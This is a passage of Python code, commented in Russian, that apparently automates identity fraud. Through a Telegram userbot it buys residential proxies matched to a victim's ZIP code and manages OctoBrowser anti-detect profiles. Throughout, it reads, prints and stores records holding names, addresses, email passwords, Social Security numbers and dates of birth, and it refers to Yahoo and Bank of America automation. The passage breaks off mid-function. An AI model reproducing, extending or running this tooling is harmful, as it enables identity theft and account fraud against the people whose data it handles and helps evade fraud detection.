async def check_zip_or_next_step(client, bot_id, lines=None):
    """Проверяет, нужен ли ввод ZIP-кода или есть еще шаги выбора"""
    try:
        print("Проверяю наличие запроса ZIP или дополнительных шагов...")
        # Ждем до 0.5 секунд для получения ответа от бота
        import asyncio
        for attempt in range(10):  # 10 попыток по 0.05 секунды
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=5):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                
                # Проверяем на запрос ZIP
                if message.text and ("zip" in message.text.lower() or "почтовый" in message.text.lower() or "индекс" in message.text.lower()):
                    print(f"✓ Найдено сообщение с запросом ZIP: {message.text[:100]}...")
                    await wait_and_send_zip_code(client, bot_id, lines)
                    return
                
                # Если есть кнопки, значит это дополнительный шаг выбора (возможно города)
                if message.buttons:
                    print(f"✓ Найдены дополнительные кнопки (возможно выбор города)")
                    # Выбираем первую кнопку для простоты
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    if all_buttons:
                        target_button = all_buttons[0]  # Первая кнопка
                        print(f"✓ Выбираю первую доступную кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        print(f"✓ Кнопка '{target_button.text}' нажата")
                        await asyncio.sleep(0.1)
                        # Проверяем снова
                        await check_zip_or_next_step(client, bot_id, lines)
                        return
            
        print("Не найдены ни запрос ZIP, ни дополнительные кнопки")
        print("Пробую перейти к вводу ZIP-кода...")
        await wait_and_send_zip_code(client, bot_id, lines)
        
    except Exception as e:
        print(f"❌ Ошибка при проверке следующего шага: {e}")
        import traceback
        traceback.print_exc()


async def wait_and_send_zip_code(client, bot_id, lines=None):
    """Ждет сообщение с запросом ZIP и отправляет код"""
    try:
        print("Жду сообщение с запросом ZIP...")
        # Ждем до 0.5 секунд для получения ответа от бота
        import asyncio
        
        # Список ZIP-кодов, где точно есть прокси
        reliable_zip_codes = [
            "10001",  # Нью-Йорк
            "90001",  # Лос-Анджелес 
            "60601",  # Чикаго
            "77001",  # Хьюстон
            "33101",  # Майами
            "33178",  # Майами (аэропорт)
            "33619",  # Тампа
            "94016",  # Сан-Франциско
            "02108",  # Бостон
            "75001",  # Даллас
            "98101",  # Сиэтл
            "20001",  # Вашингтон, округ Колумбия
            "10002",  # Нью-Йорк (другой район)
            "10003",  # Нью-Йорк (другой район)
            "10004",  # Нью-Йорк (Манхэттен)
            "90210",  # Беверли-Хиллз
            "33139",  # Майами-Бич
            "32801",  # Орландо
            "89109",  # Лас-Вегас
        ]
        
        # Извлекаем ZIP-код из данных сразу, до получения сообщения от бота
        extracted_zip_code = None
        if lines:
            extracted_zip_code = extract_zip_from_data(lines)
            if extracted_zip_code:
                print(f"✓ Предварительно извлечен ZIP-код из данных пользователя: {extracted_zip_code}")
        
        for attempt in range(15):  # увеличиваем количество попыток
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/15...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=10):  # увеличиваем количество проверяемых сообщений
                print(f"Проверяю сообщение: {message.text[:50]}...")
                
                # Проверяем на запрос ZIP
                if message.text and any(keyword in message.text.lower() for keyword in ["zip", "почтовый", "индекс", "postal", "код"]):
                    print(f"✓ Найдено сообщение с запросом ZIP: {message.text[:100]}...")
                    
                    # Используем заранее извлеченный ZIP-код, если он есть
                    zip_code = extracted_zip_code
                    
                    if not zip_code and lines:
                        # Если не смогли извлечь автоматически, пробуем найти в адресных строках
                        import re
                        for line in lines:
                            match = re.search(r'\b\d{5}(?:-\d{4})?\b', line)
                            if match:
                                zip_code = match.group().split('-')[0]  # берем только первую часть ZIP кода
                                print(f"Найден ZIP в данных: {zip_code}")
                                break
                    
                    # Если все еще нет ZIP-кода, используем значение из списка
                    if not zip_code:
                        # Если вообще не нашли ZIP-код, берем из списка надежных
                        import random
                        # Список специальных ZIP-кодов для прокси
                        zip_codes_for_proxy = [
                            "47714",  # Evansville, IN
                            "33178",  # Miami, FL
                            "10001",  # New York, NY
                            "90001",  # Los Angeles, CA
                            "77001",  # Houston, TX
                            "94016"   # San Francisco, CA
                        ]
                        zip_code = random.choice(zip_codes_for_proxy)
                        print(f"ZIP-код не найден в данных пользователя, выбран {zip_code} из списка надежных для прокси")
                    else:
                        print(f"Используем найденный ZIP-код {zip_code}")
                    
                    print(f"Отправляю ZIP-код: {zip_code}")
                    await client.send_message(bot_id, zip_code)
                    print(f"✓ ZIP-код '{zip_code}' отправлен")
                    
                    # Ждем сообщение с выбором радиуса и нажимаем случайную кнопку
                    await wait_and_click_random_radius(client, bot_id, lines)
                    return
                
                # Если есть кнопки, проверяем на выбор радиуса
                elif message.buttons and message.text and any(x in message.text.lower() for x in ["радиус", "radius"]):
                    print("Обнаружен выбор радиуса, передаю управление в wait_and_click_random_radius")
                    await wait_and_click_random_radius(client, bot_id, lines)
                    return
                # Если есть кнопки, но не радиус, это может быть выбор города или другой шаг
                elif message.buttons:
                    print("Сообщение содержит кнопки, но не запрос ZIP. Возможно, это выбор города.")
                    # Выбираем первую кнопку
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    if all_buttons:
                        target_button = all_buttons[0]  # Первая кнопка
                        print(f"✓ Выбираю первую доступную кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        print(f"✓ Кнопка '{target_button.text}' нажата")
                        await asyncio.sleep(0.1)
                        # Проверяем снова
                        await wait_and_send_zip_code(client, bot_id, lines)
                        return
        
        print("❌ Сообщение с запросом ZIP не найдено в ответе бота после всех попыток")
        print("Пробую перейти к выбору радиуса напрямую...")
        # В случае неудачи пробуем продолжить без ввода ZIP
        await wait_and_click_random_radius(client, bot_id, lines)
        
    except Exception as e:
        print(f"❌ Ошибка при отправке ZIP-кода: {e}")
        import traceback
        traceback.print_exc()


async def wait_and_click_random_radius(client, bot_id, lines=None):
    try:
        print("Жду сообщение с выбором радиуса или другими опциями...")
        import asyncio
        import random
        
        # Список надежных ZIP-кодов США для повторных попыток
        reliable_zip_codes = [
            "10001",  # Нью-Йорк, NY
            "90001",  # Лос-Анджелес, CA
            "60601",  # Чикаго, IL
            "77001",  # Хьюстон, TX
            "33101",  # Майами, FL
            "02101",  # Бостон, MA
            "75201",  # Даллас, TX
            "19101",  # Филадельфия, PA
            "20001",  # Вашингтон, DC
            "30301"   # Атланта, GA
        ]
        
        # Счетчик попыток с возвратом к вводу ZIP
        retry_with_different_zip = 0
        max_zip_retries = 3
        
        # Увеличиваем таймаут для работы с медленными ответами
        for attempt in range(40):  # 40 попыток по 0.2 секунды = 8 секунд общее время
            await asyncio.sleep(0.2)  # Увеличиваем задержку между попытками
            print(f"Попытка {attempt + 1}/40...")

            async for message in client.iter_messages(bot_id, limit=15):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                
                # Проверяем, нет ли сразу готовых результатов с прокси
                if message.text and "💎" in message.text and ("ip" in message.text.lower() or "прокси" in message.text.lower()):
                    print(f"✓ Сразу найдены результаты: {message.text[:100]}...")
                    print("Поиск завершен успешно!")
                    result = await wait_and_click_buy_button(client, bot_id, lines)
                    if result == "continue":
                        # Продолжаем цикл с новыми данными
                        continue
                    elif result == "finish":
                        # Завершаем работу
                        return
                    else:
                        # Обычное завершение
                        return
                
                # Проверяем на сообщение "Нету результатов"
                if message.text and any(phrase in message.text.lower() for phrase in ["нету результатов", "нет результатов", "no results"]):
                    print(f"❌ Найдено сообщение: {message.text[:100]}...")
                    print("Нет результатов - возвращаемся в меню...")
                    await cleanup_on_no_results()
                    return
                
                # Проверяем наличие кнопок
                if message.buttons:
                    all_buttons = []
                    for row_index, row in enumerate(message.buttons):
                        for col_index, button in enumerate(row):
                            all_buttons.append(button)
                            print(f"  Кнопка {len(all_buttons)}: '{button.text}'")
                    
                    # Проверка на кнопку "Назад"
                    if len(all_buttons) == 1 and ('назад' in all_buttons[0].text.lower() or 'back' in all_buttons[0].text.lower()):
                        print("❌ Найдена только кнопка 'Назад'. Нет вариантов радиуса.")
                        
                        # Если не исчерпаны попытки, пробуем другой ZIP-код
                        if retry_with_different_zip < max_zip_retries:
                            retry_with_different_zip += 1
                            print(f"Пробуем другой ZIP-код (попытка {retry_with_different_zip}/{max_zip_retries})")
                            await message.click(data=all_buttons[0].data)  # Нажимаем "Назад"
                            await asyncio.sleep(0.5)  # Увеличиваем паузу
                            
                            # Выбираем случайный ZIP-код из списка надежных для прокси
                            import random
                            # Используем специальный список ZIP-кодов, которые работают с прокси
                            special_zip_codes = [
                                "47714",  # Evansville, IN
                                "33178",  # Miami, FL
                                "10001",  # New York, NY
                                "90001",  # Los Angeles, CA
                                "77001",  # Houston, TX
                                "94016"   # San Francisco, CA
                            ]
                            new_zip = random.choice(special_zip_codes)
                            print(f"Выбран новый ZIP-код: {new_zip} (специальный для прокси)")
                            
                            # Возвращаемся к United States
                            await wait_and_click_united_states(client, bot_id, lines)
                            return
                        else:
                            print("Исчерпаны попытки с разными ZIP-кодами. Возвращаемся в главное меню.")
                            await message.click(data=all_buttons[0].data)
                            await asyncio.sleep(0.1)
                            await cleanup_on_no_results()
                            return
                    
                    # Если есть две или больше кнопки
                    if len(all_buttons) >= 2:
                        # Ищем кнопки с радиусом или похожие
                        target_button = None
                        radius_keywords = ["km", "км", "mi", "мили", "радиус", "radius"]
                        
                        # Пытаемся найти кнопку с радиусом
                        for button in all_buttons:
                            button_text = button.text.lower()
                            if any(keyword in button_text for keyword in radius_keywords):
                                target_button = button
                                print(f"✓ Найдена кнопка радиуса: {button.text}")
                                break
                        
                        # Если нет кнопки радиуса, но есть несколько кнопок (исключая "Назад")
                        # Проверяем на кнопки с числами или miles/мили
                        if not target_button:
                            # Сначала ищем кнопки с упоминанием миль или километров
                            for button in all_buttons:
                                if 'miles' in button.text.lower() or 'миль' in button.text.lower() or \
                                   any(num in button.text for num in ["5", "10", "20", "30"]):
                                    target_button = button
                                    print(f"✓ Выбрана кнопка с радиусом: {button.text}")
                                    break
                            
                            # Если не нашли мили, выбираем любую кнопку кроме Назад
                            if not target_button:
                                non_back_buttons = [b for b in all_buttons if not ('назад' in b.text.lower() or 'back' in b.text.lower())]
                                if non_back_buttons:
                                    # Выбираем случайную кнопку из доступных (не "Назад")
                                    target_button = random.choice(non_back_buttons)
                        
                        if target_button:
                            print(f"✓ Выбрана кнопка: {target_button.text}")
                            print("Нажимаем кнопку...")
                            await message.click(data=target_button.data)
                            print(f"✓ Кнопка '{target_button.text}' нажата")
                            # Увеличиваем паузу для ответа бота
                            await asyncio.sleep(1.5)  # Значительно увеличиваем паузу для получения ответа
                            
                            # Проверяем, что пришел результат или сообщение об ошибке
                            print("Ожидаю ответ после нажатия на радиус...")
                            async for result_message in client.iter_messages(bot_id, limit=10):  # Увеличиваем количество проверяемых сообщений
                                # Если есть сообщение с 💎, значит есть прокси
                                if result_message.text and "💎" in result_message.text:
                                    print("✅ Найдены прокси! Переходим к покупке...")
                                    await wait_and_click_buy_button(client, bot_id, lines)
                                    return
                                # Если есть сообщение об отсутствии результатов
                                elif result_message.text and any(x in result_message.text.lower() for x in ["нету результатов", "нет результатов", "no results"]):
                                    print("❌ Нет результатов - возвращаемся в меню...")
                                    await cleanup_on_no_results()
                                    return
                            
                            # Добавляем дополнительную проверку на новые сообщения с задержкой
                            print("Не обнаружены ни прокси, ни сообщение об ошибке. Ожидаем дополнительно...")
                            await asyncio.sleep(2.0)  # Ожидаем 2 секунды для получения ответа от сервера
                            
                            # Проверяем еще раз новые сообщения
                            print("Выполняю повторную проверку сообщений...")
                            have_results = False
                            async for result_message in client.iter_messages(bot_id, limit=15):
                                if result_message.text and "💎" in result_message.text:
                                    print("✅ Найдены прокси во время повторной проверки! Переходим к покупке...")
                                    await wait_and_click_buy_button(client, bot_id, lines)
                                    have_results = True
                                    return
                                elif result_message.text and any(x in result_message.text.lower() for x in ["нету результатов", "нет результатов", "no results"]):
                                    print("❌ Нет результатов - возвращаемся в меню...")
                                    await cleanup_on_no_results()
                                    have_results = True
                                    return
                            
                            if not have_results:
                                print("Проверяем результаты поиска через основную функцию...")
                                await wait_and_check_no_results(client, bot_id, lines)
                                return
                        else:
                            print(f"❌ Не найдена подходящая кнопка.")
                            print("Доступные кнопки:")
                            for i, button in enumerate(all_buttons):
                                print(f"  {i+1}: {button.text}")
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}")
                else:
                    print("Сообщение без кнопок")
                    
        print("❌ Кнопка радиуса не найдена в ответе бота после всех попыток")
        print("Пробую проверить результаты напрямую...")
        # Пробуем продолжить и проверить результаты напрямую
        await wait_and_check_no_results(client, bot_id, lines)
        
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()


async def wait_and_check_no_results(client, bot_id, lines=None):
    """Ждет результат и проверяет на сообщение с прокси (💎 и IP)"""
    try:
        print("Жду результат поиска...")
        import asyncio
        import time
        
        # Засекаем время начала ожидания для контроля длительности
        start_time = time.time()
        
        # Увеличиваем время ожидания результата значительно
        for attempt in range(60):  # 60 попыток по 0.2 секунды (12 секунд общее время)
            await asyncio.sleep(0.2)
            elapsed = time.time() - start_time
            print(f"Попытка {attempt + 1}/60... (Прошло {elapsed:.1f} сек.)")

            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=20):
                if not message.text:
                    continue
                
                text = message.text.lower()
                
                # Пропускаем служебные сообщения
                if any(x in text for x in [
                    "введите zip", "выберите радиус", "комментарий", "/start"
                ]):
                    continue
                
                # Если найден результат (💎 и ip)
                if "💎" in text and ("ip" in text or "прокси" in text):
                    print(f"✓ Найдены результаты: {message.text[:100]}...")
                    print("Поиск завершен успешно!")
                    result = await wait_and_click_buy_button(client, bot_id, lines)
                    if result == "continue":
                        # Продолжаем цикл с новыми данными
                        continue
                    elif result == "finish":
                        # Завершаем работу
                        return
                    else:
                        # Обычное завершение
                        return
                
                # Если явно нет результатов
                if any(x in text for x in ["нету результатов", "нет результатов", "не найдено", "no results"]):
                    print(f"❌ Найдено сообщение: {message.text[:100]}...")
                    print("Нет результатов - возвращаемся в меню...")
                    await cleanup_on_no_results()
                    return
                
                # Проверка на сообщение об ошибке или предупреждение
                if any(x in text for x in ["ошибка", "error", "warning", "предупреждение", "недостаточно"]):
                    print(f"⚠️ Найдено сообщение с ошибкой: {message.text[:100]}...")
                    
                    # Если есть кнопки, нажимаем первую
                    if message.buttons:
                        all_buttons = []
                        for row in message.buttons:
                            for button in row:
                                all_buttons.append(button)
                        
                        if all_buttons:
                            print(f"✓ Нажимаю первую доступную кнопку: {all_buttons[0].text}")
                            await message.click(data=all_buttons[0].data)
                            await asyncio.sleep(0.1)
                    
                    print("Возвращаемся в меню из-за ошибки...")
                    await cleanup_on_no_results()
                    return
            
            print("Сообщение без результатов")
        
        print("❌ Результат поиска не найден в ответе бота после всех попыток")
        print("Возвращаемся в главное меню...")
        await cleanup_on_no_results()
    except Exception as e:
        print(f"❌ Ошибка при проверке результатов: {e}")
        import traceback
        traceback.print_exc()


async def cleanup_on_no_results():
    """Удаляет сообщение из группы и профиль из OctoBrowser при отсутствии результатов"""
    try:
        print("Начинаю очистку...")
        
        # Попробуем еще раз запустить процесс покупки прокси с другим ZIP-кодом
        print("Попытка перезапуска процесса покупки прокси...")
        try:
            # Создаем новый клиент
            async with TelegramClient('userbot_session_send_1753737189', TELEGRAM_API_ID, TELEGRAM_API_HASH) as client:
                await client.start(phone=TELEGRAM_PHONE, password=password)
                
                # Запускаем процесс заново
                print("Запускаем процесс покупки прокси заново...")
                await send_start_to_proxy_bot_async(client)
                return
        except Exception as e:
            print(f"Не удалось перезапустить процесс покупки прокси: {e}")
        
        # Если перезапуск не удался, удаляем сообщение из группы
        try:
            async with TelegramClient('userbot_session', TELEGRAM_API_ID, TELEGRAM_API_HASH) as client:
                await client.start(phone=TELEGRAM_PHONE, password=password)
                
                # Получаем последние сообщения в группе
                async for message in client.iter_messages(TELEGRAM_GROUP_ID, limit=10):
                    if message.text and hasattr(message, 'id'):
                        # Удаляем сообщение (если у нас есть права)
                        try:
                            await message.delete()
                            print("✓ Сообщение удалено из группы")
                            break
                        except Exception as e:
                            print(f"Не удалось удалить сообщение: {e}")
                            break
                
                await client.disconnect()
        except Exception as e:
            print(f"Ошибка при удалении сообщения: {e}")
        
        # Удаляем профиль из OctoBrowser
        try:
            # Получаем ID последнего созданного профиля (нужно сохранять его)
            profile_id = get_last_created_profile_id()
            if profile_id:
                await delete_octobrowser_profile(profile_id)
                print("✓ Профиль удален из OctoBrowser")
            else:
                print("ID профиля не найден")
        except Exception as e:
            print(f"Ошибка при удалении профиля: {e}")
        
        print("Очистка завершена")
        
    except Exception as e:
        print(f"❌ Ошибка при очистке: {e}")
        import traceback
        traceback.print_exc()


def get_last_created_profile_id():
    """Получает ID последнего созданного профиля"""
    global last_created_profile_id
    return last_created_profile_id

def get_user_data_from_full_folder():
    """
    Читает данные пользователя из последней записи в full/all_registrations.json
    
    Returns:
        dict: Данные пользователя или None
    """
    try:
        import json
        full_dir = os.path.join(os.path.dirname(__file__), 'full')
        full_file_path = os.path.join(full_dir, 'all_registrations.json')
        
        if not os.path.exists(full_file_path):
            print_warning("⚠️ Файл full/all_registrations.json не найден")
            return None
        
        print_info(f"✓ Читаю данные из файла: full/all_registrations.json")
        
        with open(full_file_path, 'r', encoding='utf-8') as f:
            registrations = json.load(f)
        
        if not registrations:
            print_warning("⚠️ В файле full/all_registrations.json нет данных")
            return None
        
        # Берем последнюю запись
        latest_registration = registrations[-1]
        
        # Извлекаем данные
        user_data = {
            'email': latest_registration.get('email', ''),
            'password': latest_registration.get('password', ''),
            'ssn': latest_registration.get('ssn', ''),
            'dob': latest_registration.get('dob', ''),
            'registration_data': latest_registration.get('registration_data', {}),
            'user_data': latest_registration.get('user_data', ''),
            'telegram_response': latest_registration.get('telegram_response', '')
        }
        
        # Добавляем данные из registration_data
        reg_data = latest_registration.get('registration_data', {})
        user_data.update({
            'first_name': reg_data.get('first_name', ''),
            'last_name': reg_data.get('last_name', ''),
            'birth_month': reg_data.get('birth_month', ''),
            'birth_day': reg_data.get('birth_day', ''),
            'birth_year': reg_data.get('birth_year', ''),
            'address': reg_data.get('address', ''),
            'city_state_zip': reg_data.get('city_state_zip', ''),
            'phone': reg_data.get('phone', ''),
            'name': f"{reg_data.get('first_name', '')} {reg_data.get('last_name', '')}".strip()
        })
        
        print_success("✓ Данные успешно загружены из full/all_registrations.json")
        return user_data
        
    except Exception as e:
        print_error(f"❌ Ошибка при чтении данных из full/all_registrations.json: {e}")
        return None

def get_user_data_from_data_folder():
    """
    Читает данные пользователя из TXT файлов в папке data/
    
    Returns:
        dict: Данные пользователя или None
    """
    try:
        data_folder = "data"
        if not os.path.exists(data_folder):
            print_warning("⚠️ Папка data/ не найдена")
            return None
        
        # Ищем TXT файлы в папке data
        txt_files = [f for f in os.listdir(data_folder) if f.endswith('.txt')]
        
        if not txt_files:
            print_warning("⚠️ TXT файлы не найдены в папке data/")
            return None
        
        # Берем самый новый TXT файл
        latest_file = max(txt_files, key=lambda x: os.path.getctime(os.path.join(data_folder, x)))
        file_path = os.path.join(data_folder, latest_file)
        
        print_info(f"✓ Читаю данные из файла: {latest_file}")
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
        
        # Парсим данные из файла
        lines = content.split('\n')
        
        # Ищем строки с данными
        user_data = {}
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('-') or line.startswith('='):
                continue
            
            # Ищем имя (обычно первая строка)
            if not user_data.get('name') and len(line.split()) >= 2:
                user_data['name'] = line
                continue
            
            # Ищем адрес (содержит цифры и буквы)
            if not user_data.get('address') and re.search(r'\d+', line):
                user_data['address'] = line
                continue
            
            # Ищем город, штат, ZIP (формат: City, ST 12345)
            if not user_data.get('city_state_zip') and ',' in line and re.search(r'[A-Z]{2}\s+\d{5}', line):
                user_data['city_state_zip'] = line
                continue
            
            # Ищем дату рождения (формат: Month Year)
            if not user_data.get('birth_date') and re.search(r'[A-Za-z]+\s+\d{4}', line):
                user_data['birth_date'] = line
                continue
            
            # Ищем телефон (содержит скобки и цифры)
            if not user_data.get('phone') and re.search(r'\(\d{3}\)\s*\d{3}-\d{4}', line):
                user_data['phone'] = line
                continue
            
            # Ищем SSN (9 цифр)
            if not user_data.get('ssn') and re.search(r'\d{3}-\d{2}-\d{4}', line):
                user_data['ssn'] = line
                continue
            
            # Ищем DOB (формат: MM/DD/YYYY)
            if not user_data.get('dob') and re.search(r'\d{2}/\d{2}/\d{4}', line):
                user_data['dob'] = line
                continue
            
            # Ищем email
            if not user_data.get('email') and '@' in line and '.' in line:
                user_data['email'] = line
                continue
        
        if not user_data.get('name'):
            print_warning("⚠️ Имя не найдено в файле")
            return None
        
        print_success("✓ Данные успешно загружены из файла")
        return user_data
        
    except Exception as e:
        print_error(f"❌ Ошибка при чтении данных из папки data/: {e}")
        return None

def save_user_data_to_data_folder(user_data):
    """
    Сохраняет данные пользователя в TXT файл в папке data/
    
    Args:
        user_data (dict): Данные пользователя
    """
    try:
        data_folder = "data"
        if not os.path.exists(data_folder):
            os.makedirs(data_folder)
        
        # Создаем имя файла с текущей датой и временем
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"user_data_{timestamp}.txt"
        file_path = os.path.join(data_folder, filename)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"Имя: {user_data.get('name', '')}\n")
            f.write(f"Адрес: {user_data.get('address', '')}\n")
            f.write(f"Город/Штат/ZIP: {user_data.get('city_state_zip', '')}\n")
            f.write(f"Дата рождения: {user_data.get('birth_date', '')}\n")
            f.write(f"Телефон: {user_data.get('phone', '')}\n")
            f.write(f"SSN: {user_data.get('ssn', '')}\n")
            f.write(f"DOB: {user_data.get('dob', '')}\n")
            f.write(f"Email: {user_data.get('email', '')}\n")
            f.write("-" * 50 + "\n")
        
        print_success(f"✓ Данные сохранены в файл: {filename}")
        
    except Exception as e:
        print_error(f"❌ Ошибка при сохранении данных: {e}")

def update_user_data_with_ssn_dob(ssn, dob):
    """
    Обновляет последний TXT файл в папке data/ с SSN и DOB, а также 
    создает или обновляет отдельный файл SSN_DOB.txt в папке data/
    
    Args:
        ssn (str): SSN
        dob (str): DOB
    """
    try:
        data_folder = "data"
        if not os.path.exists(data_folder):
            print_warning("⚠️ Папка data/ не найдена")
            return
        
        # 1. Создаем отдельный файл с SSN и DOB
        ssn_dob_file = os.path.join(data_folder, "SSN_DOB.txt")
        current_date = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
        
        # Проверяем существование файла и читаем его содержимое
        try:
            with open(ssn_dob_file, 'r', encoding='utf-8') as f:
                content = f.read()
        except FileNotFoundError:
            content = f"Файл создан: {current_date}\n\n"
        
        # Добавляем новую запись в начало файла
        with open(ssn_dob_file, 'w', encoding='utf-8') as f:
            f.write(f"Дата: {current_date}\n")
            f.write(f"SSN: {ssn}\n")
            f.write(f"DOB: {dob}\n")
            f.write("-" * 40 + "\n\n")
            # Добавляем предыдущее содержимое
            f.write(content)
        
        print_success(f"✓ Создана новая запись SSN и DOB в файле: SSN_DOB.txt")
        
        # 2. Обновляем последний TXT файл профиля
        txt_files = [f for f in os.listdir(data_folder) if f.endswith('.txt') and f != "SSN_DOB.txt"]
        
        if not txt_files:
            print_warning("⚠️ Файлы профилей не найдены в папке data/")
            return
        
        # Берем самый новый TXT файл
        latest_file = max(txt_files, key=lambda x: os.path.getctime(os.path.join(data_folder, x)))
        file_path = os.path.join(data_folder, latest_file)
        
        # Читаем содержимое файла
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                lines = content.split('\n') if content else []
        except:
            lines = []
        
        # Если файл пустой или не содержит данных, создаем базовую структуру
        if not lines or all(line.strip() == '' for line in lines):
            print_info("📝 Создаю структуру файла с SSN и DOB...")
            lines = [
                "Имя: [Требуется заполнение]",
                "Адрес: [Требуется заполнение]",
                "Город/Штат/ZIP: [Требуется заполнение]",
                "Дата рождения: [Требуется заполнение]",
                "Телефон: [Требуется заполнение]",
                f"SSN: {ssn}",
                f"DOB: {dob}",
                "Email: [Требуется заполнение]",
                "--------------------------------------------------"
            ]
        else:
            # Обновляем или добавляем SSN и DOB
            updated_lines = []
            ssn_found = False
            dob_found = False
            
            for line in lines:
                if line.startswith('SSN:'):
                    updated_lines.append(f"SSN: {ssn}")
                    ssn_found = True
                elif line.startswith('DOB:'):
                    updated_lines.append(f"DOB: {dob}")
                    dob_found = True
                else:
                    updated_lines.append(line)
            
            # Если SSN или DOB не найдены, добавляем их в конец
            if not ssn_found:
                updated_lines.append(f"SSN: {ssn}")
            if not dob_found:
                updated_lines.append(f"DOB: {dob}")
            
            lines = updated_lines
        
        # Записываем обновленный файл
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))
        
        print_success(f"✓ SSN и DOB обновлены в файле профиля: {latest_file}")
        print_info(f"🆔 SSN: {ssn}")
        print_info(f"📅 DOB: {dob}")
        
    except Exception as e:
        print_error(f"❌ Ошибка при обновлении SSN и DOB: {e}")
        import traceback
        traceback.print_exc()

def parse_user_data_boa(user_data_text=None):
    """
    Парсит данные пользователя из full/all_registrations.json для автоматизации Yahoo
    (Bank of America автоматизация отключена, но функция все еще используется для Yahoo)
    
    Args:
        user_data_text (str): Опционально - текст с данными (для обратной совместимости)
        
    Returns:
        dict: Словарь с данными пользователя
    """
    try:
        # Получаем данные из full/all_registrations.json
        user_data = get_user_data_from_full_folder()
        
        if not user_data:
            print_warning("⚠️ Не удалось получить данные из full/all_registrations.json")
            return None
        
        # Извлекаем компоненты имени
        full_name = user_data.get('name', '')
        first_name = user_data.get('first_name', '')
        last_name = user_data.get('last_name', '')
        
        if not full_name and first_name and last_name:
            full_name = f"{first_name} {last_name}"
        
        # Извлекаем компоненты адреса
        address = user_data.get('address', '')
        city_state_zip = user_data.get('city_state_zip', '')
        
        # Парсим город, штат, ZIP
        city, state, zip_code = '', '', ''
        if city_state_zip:
            parts = city_state_zip.split(',')
            if len(parts) >= 2:
                city = parts[0].strip()
                state_zip = parts[1].strip()
                state_zip_parts = state_zip.split()
                if len(state_zip_parts) >= 2:
                    state = state_zip_parts[0]
                    zip_code = state_zip_parts[1]
        
        # Извлекаем дату рождения
        birth_month = user_data.get('birth_month', '')
        birth_day = user_data.get('birth_day', '')
        birth_year = user_data.get('birth_year', '')
        birth_date = f"{birth_month} {birth_year}" if birth_month and birth_year else ''
        
        # Парсим телефон
        phone = user_data.get('phone', '')
        phone_clean = re.sub(r'[^\d]', '', phone) if phone else ""
        
        # Получаем SSN и DOB
        ssn = user_data.get('ssn', '')
        dob = user_data.get('dob', '')
        
        # Получаем email и пароль
        email = user_data.get('email', '')
        password = user_data.get('password', '')
        
        print_success("✓ Данные пользователя успешно загружены из full/all_registrations.json")
        print_info(f"📋 Имя: {full_name}")
        print_info(f"📧 Email: {email}")
        print_info(f"📱 Телефон: {phone}")
        print_info(f"🆔 SSN: {ssn}")
        print_info(f"📅 DOB: {dob}")
        
        return {
            "full_name": full_name,
            "first_name": first_name,
            "last_name": last_name,
            "address": address,
            "city": city,
            "state": state,
            "zip_code": zip_code,
            "birth_date": birth_date,
            "birth_month": birth_month,
            "birth_day": birth_day,
            "birth_year": birth_year,
            "ssn": ssn,
            "dob": dob,
            "phone": phone,
            "phone_clean": phone_clean,
            "email": email,
            "password": password,
            "profile_name": format_profile_name(full_name)
        }
        
    except Exception as e:
        print_error(f"❌ Ошибка при парсинге данных пользователя: {e}")
        return None


async def delete_octobrowser_profile(profile_id):
    """Удаляет профиль из OctoBrowser"""
    try:
        print(f"Запрос на удаление профиля OctoBrowser с ID: {profile_id}")
        # В обновленном модуле octo.py нет функции для удаления профиля,
        # так как локальный API OctoBrowser не поддерживает удаление профилей
        print("Внимание: Удаление профилей через локальный API не поддерживается.")
        print("Пожалуйста, удалите профиль вручную через интерфейс OctoBrowser.")
        print(f"UUID профиля для удаления: {profile_id}")
        return True
    except Exception as e:
        print(f"Ошибка при удалении профиля OctoBrowser: {e}")
        return False


def extract_zip_from_data(data_lines):
    """Извлекает ZIP-код из данных пользователя"""
    try:
        # Проверяем, что данные переданы
        if not data_lines or len(data_lines) < 1:
            print("❌ Данные не найдены")
            return None
            
        import re
        
        # Проверим явно формат из примера - третья строка должна содержать город, штат и ZIP
        # Типичный формат: "Highland, CA 92346"
        if len(data_lines) >= 3:
            city_state_line = data_lines[2]  # Обычно это третья строка (индекс 2)
            print(f"Проверяем строку с городом/штатом: {city_state_line}")
            
            # Проверяем на шаблон "Город, Штат ZIP"
            city_state_zip_match = re.search(r'([A-Za-z\s\'\.\-]+),\s*([A-Z]{2})\s+(\d{5}(?:-\d{4})?)', city_state_line)
            if city_state_zip_match:
                city = city_state_zip_match.group(1).strip()
                state = city_state_zip_match.group(2).strip()
                zip_code = city_state_zip_match.group(3).split('-')[0]
                print(f"✓ Найден ZIP-код {zip_code} для города {city}, штат {state}")
                return zip_code
            
            # Просто ищем ZIP-код в этой строке
            zip_match = re.search(r'\b\d{5}(?:-\d{4})?\b', city_state_line)
            if zip_match:
                zip_code = zip_match.group().split('-')[0]
                print(f"✓ Найден ZIP-код {zip_code} в строке с городом/штатом")
                return zip_code
                
        # Сначала ищем строку с упоминанием ZIP или индекса
        zip_line = None
        for i, line in enumerate(data_lines):
            if re.search(r'ZIP|zip|индекс|почтовый|postal', line, re.IGNORECASE):
                zip_line = line
                print(f"Найдена строка с упоминанием ZIP: {line}")
                break
                
        # Если нашли такую строку, ищем в ней ZIP-код
        if zip_line:
